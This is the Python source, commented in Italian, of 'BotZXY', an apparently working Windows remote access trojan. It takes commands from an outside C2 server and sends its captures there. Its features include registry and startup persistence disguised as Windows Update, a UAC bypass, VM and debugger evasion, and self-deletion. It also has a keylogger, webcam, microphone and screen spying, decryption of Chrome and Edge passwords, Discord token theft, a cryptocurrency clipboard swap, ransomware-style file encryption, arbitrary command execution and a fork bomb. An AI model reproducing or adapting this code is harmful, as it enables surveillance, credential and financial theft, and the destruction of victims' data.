#!/usr/bin/env python3
# BotZXY - Windows Client POTENZIATO v3.0
# Comandi estesi: posizione, filesystem, persistenza, hardware, browser/social,
# crypto, monitoraggio, interazione vittima, rete, processi, potenza.

import requests
import platform
import socket
import os
import sys
import time
import json
import base64
import subprocess
import threading
import ctypes
import ctypes.wintypes
import random
import string
import re
import glob
import shutil
import io
from datetime import datetime
from urllib.parse import urlparse

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI CON IL TUO URL
DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
POLL_INTERVAL = 3
BOT_NAME = "BotZXY"
VERSION = "3.0"

# Configurazione crypto-clipboard (sostituisci con i TUOI address)
CRYPTO_SWAP = {
    "btc": "1BotZXYatt4ck3r4ddr3ssh3r3pl4c3btcxxxxxx",
    "eth": "0xBotZXYatt4ck3r4ddr3ssh3r3pl4c3ethxxxxxxx",
}

# ============ CLIENT ============
class BotZXYClient:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        self.keylog_buffer = []
        self.hidden = False
        self.flags = {'webcam_rec': False, 'mic_rec': False, 'screen_rec': False,
                      'clipboard_crypto': False, 'keylogger': False}
        self.stream_threads = []

    def hide_console(self):
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            self.hidden = True
        except:
            pass

    # ---------- REGISTRAZIONE / POLL ----------
    def register(self):
        data = {
            'device_id': self.device_id, 'platform': 'windows',
            'hostname': socket.gethostname(), 'os_version': platform.version(),
            'cpu': platform.processor(), 'bot_version': VERSION
        }
        try:
            r = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            return r.status_code == 200
        except:
            return False

    def poll_commands(self):
        try:
            r = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    threading.Thread(target=self.execute_command,
                                     args=(cmd['id'], cmd['command'], cmd['params']),
                                     daemon=True).start()
        except:
            pass

    def send_result(self, cmd_id, result, status="executed"):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}",
                              json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
        except:
            pass

    def upload_capture(self, ctype, data):
        try:
            self.session.post(f"{self.c2_url}/api/capture/{self.device_id}",
                              json={'type': ctype, 'data': data}, timeout=30)
        except:
            pass

    # ---------- PERSISTENZA ----------
    def install_persistence(self):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            h = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            svc = ''.join(random.choices(string.ascii_letters, k=8))
            exe = os.path.join(os.path.dirname(sys.executable), 'botzxy_client.exe')
            if not os.path.exists(exe):
                exe = sys.executable
            winreg.SetValueEx(h, f"WindowsUpdate_{svc}", 0, winreg.REG_SZ, f'"{exe}" --hidden')
            winreg.CloseKey(h)
            startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                  'Start Menu', 'Programs', 'Startup')
            ps = f'$s=New-Object -comObject WScript.Shell;$c=$s.CreateShortcut("{startup}\\SystemHelper_{svc}.lnk");$c.TargetPath="{exe}";$c.Arguments="--hidden";$c.Save()'
            subprocess.run(['powershell', '-Command', ps], shell=True, capture_output=True)
            return "Persistenza installata (Run + Startup)"
        except Exception as e:
            return f"ERR persistenza: {e}"

    def uac_bypass(self):
        try:
            windir = os.environ.get('WINDIR', 'C:\\Windows')
            payload = sys.executable
            cd = os.path.join(windir, 'System32', 'ComputerDefaults.exe')
            reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
            import winreg
            h = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(h, "", 0, winreg.REG_SZ, payload)
            winreg.SetValueEx(h, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(h)
            subprocess.Popen(cd, shell=True)
            time.sleep(2)
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            return "Tentativo UAC bypass (ComputerDefaults) inviato"
        except Exception as e:
            return f"ERR uac: {e}"

    def self_delete(self):
        try:
            bat = os.path.join(os.environ['TEMP'], 'botzxy_del.bat')
            with open(bat, 'w') as f:
                f.write(f'@echo off\nping -n 2 127.0.0.1 >nul\ndel /f /q "{sys.executable}"\ndel /f /q "%~f0"\n')
            subprocess.Popen(f'cmd /c "{bat}"', shell=True)
            self.running = False
            os._exit(0)
        except:
            pass

    def anti_vm(self):
        signs = []
        try:
            out = subprocess.check_output('systeminfo', shell=True, text=True, stderr=subprocess.DEVNULL)
            for kw in ['VirtualBox', 'VMware', 'Xen', 'Hyper-V', 'QEMU', 'Parallels']:
                if kw.lower() in out.lower():
                    signs.append(kw)
        except:
            pass
        try:
            mac = uuid_mac()
            if mac.startswith(('08:00:27', '00:0C:29', '00:50:56', '00:15:5D')):
                signs.append('VM-MAC')
        except:
            pass
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                signs.append('DEBUGGER')
        except:
            pass
        return {'vm_detected': bool(signs), 'signs': signs}

    # ---------- CATTURE ----------
    def take_screenshot(self):
        try:
            import pyautogui
            buf = io.BytesIO()
            pyautogui.screenshot().save(buf, format="PNG")
            return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            return f"SCREENSHOT_ERROR: {e}"

    def take_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, b = cv2.imencode('.jpg', frame)
                return base64.b64encode(b).decode()
            return "WEBCAM_ERROR"
        except Exception as e:
            return f"WEBCAM_ERROR: {e}"

    def record_microphone(self, seconds=10):
        try:
            import pyaudio
            import wave
            CHUNK, FMT, CH, RATE = 1024, pyaudio.paInt16, 1, 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FMT, channels=CH, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = [stream.read(CHUNK) for _ in range(int(RATE/CHUNK*seconds))]
            stream.stop_stream(); stream.close(); p.terminate()
            buf = io.BytesIO()
            w = wave.open(buf, 'wb'); w.setnchannels(CH); w.setsampwidth(2)
            w.setframerate(RATE); w.writeframes(b''.join(frames)); w.close()
            return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            return f"MIC_ERROR: {e}"

    # ---------- KEYLOGGER ----------
    def start_keylogger(self):
        try:
            import keyboard
            keyboard.on_press(self._kl_cb)
            self.flags['keylogger'] = True
            return "Keylogger avviato"
        except Exception as e:
            return f"ERR kl: {e}"

    def _kl_cb(self, ev):
        try:
            self.keylog_buffer.append({'key': ev.name, 't': datetime.now().isoformat()})
            if len(self.keylog_buffer) >= 30:
                self.upload_capture('keylog', json.dumps(self.keylog_buffer))
                self.keylog_buffer = []
        except:
            pass

    def keylogger_dump(self):
        if self.keylog_buffer:
            self.upload_capture('keylog', json.dumps(self.keylog_buffer))
            self.keylog_buffer = []
        return "Keylog inviato"

    # ---------- CLIPBOARD ----------
    def _monitor_clipboard(self):
        last = None
        while self.running and self.flags.get('clipboard_crypto'):
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    txt = win32clipboard.GetClipboardData()
                    if txt and txt != last:
                        new = self._swap_crypto(txt)
                        if new != txt:
                            win32clipboard.EmptyClipboard()
                            win32clipboard.SetClipboardText(new)
                            self.upload_capture('clipboard_crypto', {'original': txt, 'replaced': new})
                        last = txt
                win32clipboard.CloseClipboard()
            except:
                pass
            time.sleep(2)

    def _swap_crypto(self, text):
        btc_re = re.compile(r'\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b')
        eth_re = re.compile(r'\b0x[a-fA-F0-9]{40}\b')
        text = btc_re.sub(CRYPTO_SWAP['btc'], text)
        text = eth_re.sub(CRYPTO_SWAP['eth'], text)
        return text

    # ---------- POSIZIONE / RETE ----------
    def gps(self):
        info = {'ip_geo': {}, 'wifi': self.grab_wifi_networks()}
        try:
            r = self.session.get("http://ip-api.com/json/", timeout=8)
            if r.status_code == 200:
                d = r.json()
                info['ip_geo'] = {'city': d.get('city'), 'region': d.get('regionName'),
                                  'country': d.get('country'), 'lat': d.get('lat'),
                                  'lon': d.get('lon'), 'isp': d.get('isp'),
                                  'query': d.get('query')}
        except:
            pass
        return info

    def public_ip(self):
        try:
            return self.session.get("https://api.ipify.org?format=json", timeout=8).json().get('ip')
        except:
            return "ERR"

    def netinfo(self):
        try:
            import psutil
            out = []
            for sn, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.family == 2:
                        out.append({'iface': sn, 'ip': a.address})
            return out
        except Exception as e:
            return f"ERR: {e}"

    def grab_wifi_networks(self):
        nets = []
        try:
            out = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in out.split('\n'):
                if 'All User Profile' in line or 'Profilo utente' in line:
                    ssid = line.split(':')[-1].strip()
                    if ssid:
                        nets.append({'ssid': ssid, 'password': self._wifi_pw(ssid)})
        except:
            pass
        return nets

    def _wifi_pw(self, ssid):
        try:
            out = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear',
                                          shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in out.split('\n'):
                if 'Key Content' in line or 'Contenuto chiave' in line:
                    return line.split(':')[-1].strip()
        except:
            pass
        return ''

    # ---------- SISTEMA ----------
    def sysinfo(self):
        try:
            import psutil
            return {
                'hostname': socket.gethostname(), 'os': platform.version(),
                'cpu': platform.processor(), 'cores': psutil.cpu_count(),
                'ram_gb': round(psutil.virtual_memory().total/1024**3, 2),
                'user': os.getlogin(), 'boot': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'arch': platform.machine()
            }
        except Exception as e:
            return f"ERR: {e}"

    # ---------- PROCESSI ----------
    def list_processes(self):
        try:
            import psutil
            return [{'pid': p.pid, 'name': p.name(), 'cpu': p.cpu_percent(),
                     'mem': round(p.memory_info().rss/1024/1024, 1)} for p in psutil.process_iter()]
        except Exception as e:
            return f"ERR: {e}"

    def kill_process(self, target):
        try:
            import psutil
            if target.isdigit():
                psutil.Process(int(target)).kill()
            else:
                for p in psutil.process_iter():
                    if p.name().lower() == target.lower():
                        p.kill()
            return f"Kill: {target}"
        except Exception as e:
            return f"ERR: {e}"

    def suspend_process(self, target):
        try:
            import psutil
            pid = int(target) if target.isdigit() else next(p.pid for p in psutil.process_iter() if p.name().lower()==target.lower())
            psutil.Process(pid).suspend()
            return f"Suspend: {target}"
        except Exception as e:
            return f"ERR: {e}"

    def start_process(self, path):
        try:
            subprocess.Popen(path, shell=True)
            return f"Started: {path}"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- FILE SYSTEM ----------
    def file_list(self, path="."):
        try:
            items = []
            for e in os.scandir(path):
                items.append({'name': e.name, 'dir': e.is_dir(), 'size': (e.stat().st_size if e.is_file() else 0)})
            return {'path': os.path.abspath(path), 'items': items}
        except Exception as e:
            return f"ERR: {e}"

    def file_download(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"ERR: {e}"

    def file_upload(self, raw):
        try:
            path, b64 = raw.split('|', 1)
            with open(path, 'wb') as f:
                f.write(base64.b64decode(b64))
            return f"Written: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_delete(self, path):
        try:
            os.remove(path) if os.path.isfile(path) else shutil.rmtree(path)
            return f"Deleted: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_search(self, raw):
        pattern = raw.split('|')[0] if '|' in raw else raw
        root = raw.split('|')[1] if '|' in raw else os.path.expanduser('~')
        hits = []
        try:
            for dp, _, fn in os.walk(root):
                for f in fn:
                    if pattern.lower() in f.lower():
                        hits.append(os.path.join(dp, f))
                        if len(hits) >= 200:
                            return hits
        except:
            pass
        return hits

    def encrypt_files(self, raw):
        try:
            from cryptography.fernet import Fernet
            d, ext = (raw.split('|') + ['.txt'])[:2]
            key = Fernet.generate_key()
            f = Fernet(key)
            count = 0
            for dp, _, fn in os.walk(d):
                for name in fn:
                    if name.endswith(ext) and not name.endswith('.locked'):
                        p = os.path.join(dp, name)
                        try:
                            data = open(p, 'rb').read()
                            open(p + '.locked', 'wb').write(f.encrypt(data))
                            os.remove(p)
                            count += 1
                        except:
                            pass
            self.upload_capture('ransom_key', {'key': key.decode(), 'count': count, 'dir': d})
            return f"Cifrati {count} file con estensione {ext}"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- BROWSER / DATI ----------
    def _decrypt_chrome(self, browser='chrome'):
        try:
            import win32crypt
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            base = os.getenv('LOCALAPPDATA')
            name = 'Google\\Chrome' if browser == 'chrome' else 'Microsoft\\Edge'
            db = os.path.join(base, name, 'User Data', 'Default', 'Login Data')
            local = os.path.join(base, name, 'User Data', 'Local State')
            if not os.path.exists(db):
                return []
            key_b64 = json.loads(open(local).read())['os_crypt']['encrypted_key']
            key = win32crypt.CryptUnprotectData(base64.b64decode(key_b64)[5:], None, None, None, 0)[1]
            tmp = os.path.join(os.environ['TEMP'], f'{browser}_login.db')
            shutil.copy2(db, tmp)
            import sqlite3
            con = sqlite3.connect(tmp)
            rows = con.execute('SELECT origin_url,username_value,password_value FROM logins').fetchall()
            con.close()
            out = []
            for url, user, blob in rows:
                try:
                    n = blob[3:15]; t = blob[15:]
                    pw = AESGCM(key).decrypt(n, t, None).decode()
                except:
                    pw = '[ERR]'
                out.append({'url': url, 'user': user, 'pass': pw})
            return out
        except Exception as e:
            return [{'error': str(e)}]

    def steal_browser(self):
        res = {'chrome': self._decrypt_chrome('chrome'), 'edge': self._decrypt_chrome('edge')}
        self.upload_capture('browser_passwords', res)
        return f"Chrome:{len(res['chrome'])} Edge:{len(res['edge'])}"

    def steal_discord(self):
        try:
            lp = os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb')
            tokens = []
            if os.path.isdir(lp):
                for f in os.listdir(lp):
                    if f.endswith('.log') or f.endswith('.ldb'):
                        txt = open(os.path.join(lp, f), errors='ignore').read()
                        for m in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', txt):
                            tokens.append(m)
            self.upload_capture('discord_tokens', tokens)
            return f"Discord tokens: {len(tokens)}"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- INTERAZIONE VITTIMA ----------
    def msgbox(self, text):
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "System", 0x40 | 0x30)
            return "MessageBox inviato"
        except Exception as e:
            return f"ERR: {e}"

    def wallpaper(self, path):
        try:
            SPI_SETDESKWALLPAPER = 20
            if path.startswith('http'):
                import urllib.request
                local = os.path.join(os.environ['TEMP'], 'botzxy_wallpaper.jpg')
                urllib.request.urlretrieve(path, local)
                path = local
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
            return f"Wallpaper: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def tts(self, text):
        try:
            try:
                import pyttsx3
                pyttsx3.speak(text)
            except:
                import win32com.client
                sp = win32com.client.Dispatch("SAPI.SpVoice")
                sp.Speak(text)
            return "TTS: " + text
        except Exception as e:
            return f"ERR: {e}"

    def monitor_off(self):
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        return "Monitor OFF"

    def monitor_on(self):
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        return "Monitor ON"

    def beep(self, raw):
        try:
            import winsound
            freq, dur = (int(x) for x in raw.split('|')) if '|' in raw else (1000, 500)
            winsound.Beep(freq, dur)
            return "Beep"
        except Exception as e:
            return f"ERR: {e}"

    def brightness(self, val):
        try:
            subprocess.run(f'powershell (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{val})',
                           shell=True, capture_output=True)
            return f"Brightness {val}"
        except Exception as e:
            return f"ERR: {e}"

    def bsod_fake(self):
        try:
            import tkinter as tk
            root = tk.Tk(); root.attributes('-fullscreen', True); root.configure(bg='#0000aa')
            tk.Label(root, text=":(  CRITICAL PROCESS DIED", fg='white', bg='#0000aa',
                     font=('Consolas', 40)).pack(expand=True)
            root.after(5000, root.destroy); root.mainloop()
            return "Fake BSOD mostrato"
        except Exception as e:
            return f"ERR: {e}"

    def bsod_real(self):
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            os._exit(0)
        except:
            pass

    def fork_bomb(self):
        try:
            while True:
                os.system("start cmd /c python -c \"import os;os.system('start')\"")
        except:
            pass

    def jumpscare(self):
        try:
            import tkinter as tk
            root = tk.Tk(); root.attributes('-fullscreen', True); root.configure(bg='black')
            tk.Label(root, text="\uD83D\uDC7B", font=('Arial', 400)).pack(expand=True)
            try:
                import winsound
                winsound.PlaySound('*', winsound.SND_ALIAS)
            except:
                pass
            root.after(2000, root.destroy); root.mainloop()
            return "Jumpscare"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- RETE ----------
    def block_site(self, domain):
        try:
            hosts = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts, 'a') as f:
                f.write(f"\n127.0.0.1 {domain}\n")
            return f"Bloccato: {domain}"
        except Exception as e:
            return f"ERR: {e}"

    def unblock_site(self, domain):
        try:
            hosts = r"C:\Windows\System32\drivers\etc\hosts"
            lines = [l for l in open(hosts) if domain not in l]
            open(hosts, 'w').writelines(lines)
            return f"Sbloccato: {domain}"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- POTENZA ----------
    def shutdown(self): subprocess.Popen("shutdown /s /t 0", shell=True); return "Shutdown"
    def restart(self): subprocess.Popen("shutdown /r /t 0", shell=True); return "Restart"
    def logoff(self): subprocess.Popen("shutdown /l", shell=True); return "Logoff"
    def sleep(self): subprocess.Popen("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True); return "Sleep"

    # ---------- STREAMING (thread) ----------
    def _stream_webcam(self, interval):
        self.flags['webcam_rec'] = True
        while self.running and self.flags['webcam_rec']:
            self.upload_capture('webcam_stream', self.take_webcam())
            time.sleep(interval)

    def _stream_mic(self, interval):
        self.flags['mic_rec'] = True
        while self.running and self.flags['mic_rec']:
            self.upload_capture('mic_stream', self.record_microphone(min(interval, 10)))
            time.sleep(interval)

    def _stream_screen(self, interval):
        self.flags['screen_rec'] = True
        while self.running and self.flags['screen_rec']:
            self.upload_capture('screen_stream', self.take_screenshot())
            time.sleep(interval)

    # ---------- DISPATCH ----------
    def execute_command(self, cmd_id, command, params):
        params = params or ''
        try:
            r = self._dispatch(command, params)
            self.send_result(cmd_id, r)
        except Exception as e:
            self.send_result(cmd_id, f"ERROR: {e}", "failed")

    def _dispatch(self, command, params):
        if command == "screenshot": return self.take_screenshot()
        if command == "webcam": return self.take_webcam()
        if command == "mic":
            secs = int(params.split('=')[1]) if '=' in params else 10
            return self.record_microphone(secs)
        if command == "webcam_rec":
            iv = int(params) if params.isdigit() else 5
            t = threading.Thread(target=self._stream_webcam, args=(iv,), daemon=True)
            self.stream_threads.append(t); t.start(); return "Webcam stream ON"
        if command == "mic_rec":
            iv = int(params) if params.isdigit() else 5
            t = threading.Thread(target=self._stream_mic, args=(iv,), daemon=True)
            self.stream_threads.append(t); t.start(); return "Mic stream ON"
        if command == "screen_rec":
            iv = int(params) if params.isdigit() else 5
            t = threading.Thread(target=self._stream_screen, args=(iv,), daemon=True)
            self.stream_threads.append(t); t.start(); return "Screen stream ON"
        if command == "keylogger_start": return self.start_keylogger()
        if command == "keylogger_dump": return self.keylogger_dump()
        if command in ("gps", "location"): return self.gps()
        if command == "public_ip": return self.public_ip()
        if command == "netinfo": return self.netinfo()
        if command == "sysinfo": return self.sysinfo()
        if command == "grab_wifi": return self.grab_wifi_networks()
        if command == "list_processes": return self.list_processes()
        if command == "kill_process": return self.kill_process(params)
        if command == "suspend_process": return self.suspend_process(params)
        if command == "start_process": return self.start_process(params)
        if command == "file_list": return self.file_list(params or '.')
        if command == "file_download": return self.file_download(params)
        if command == "file_upload": return self.file_upload(params)
        if command == "file_delete": return self.file_delete(params)
        if command == "file_search": return self.file_search(params)
        if command == "encrypt_files": return self.encrypt_files(params)
        if command == "grab_passwords": return json.dumps(self._decrypt_chrome('chrome'))
        if command == "steal_browser": return self.steal_browser()
        if command == "steal_discord": return self.steal_discord()
        if command == "msgbox": return self.msgbox(params)
        if command == "wallpaper": return self.wallpaper(params)
        if command == "tts": return self.tts(params)
        if command == "monitor_off": return self.monitor_off()
        if command == "monitor_on": return self.monitor_on()
        if command == "beep": return self.beep(params)
        if command == "brightness": return self.brightness(int(params) if params.isdigit() else 50)
        if command == "bsod_fake": return self.bsod_fake()
        if command == "bsod_real": self.bsod_real(); return "BSOD"
        if command == "fork_bomb": self.fork_bomb(); return "Fork bomb"
        if command == "jumpscare": return self.jumpscare()
        if command == "block_site": return self.block_site(params)
        if command == "unblock_site": return self.unblock_site(params)
        if command == "persistence": return self.install_persistence()
        if command == "uac_bypass": return self.uac_bypass()
        if command == "anti_vm": return self.anti_vm()
        if command == "self_delete": self.self_delete(); return "Self-delete"
        if command == "clipboard_crypto":
            if not self.flags['clipboard_crypto']:
                self.flags['clipboard_crypto'] = True
                threading.Thread(target=self._monitor_clipboard, daemon=True).start()
            return "Clipboard crypto monitor ON"
        if command == "shutdown": return self.shutdown()
        if command == "restart": return self.restart()
        if command == "logoff": return self.logoff()
        if command == "sleep": return self.sleep()
        if command == "execute":
            out = subprocess.run(params, shell=True, capture_output=True, text=True, timeout=60)
            return out.stdout + out.stderr
        if command == "uninstall":
            self.running = False; os._exit(0)
        return f"Unknown command: {command}"

    # ---------- LOOP ----------
    def run(self):
        print(f"[+] {self.bot_name} Client v{VERSION} starting: {self.device_id}")
        if '--hidden' in sys.argv or self.hidden:
            self.hide_console()
        self.install_persistence()
        self.start_keylogger()
        if not self.register():
            print("[-] Registration failed, retrying in 60s...")
            time.sleep(60)
            return
        print(f"[+] {self.bot_name} running, polling every {POLL_INTERVAL}s")
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(30)


def uuid_mac():
    try:
        import uuid
        return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1])
    except:
        return "00:00:00:00:00:00"


if __name__ == "__main__":
    client = BotZXYClient()
    client.run()
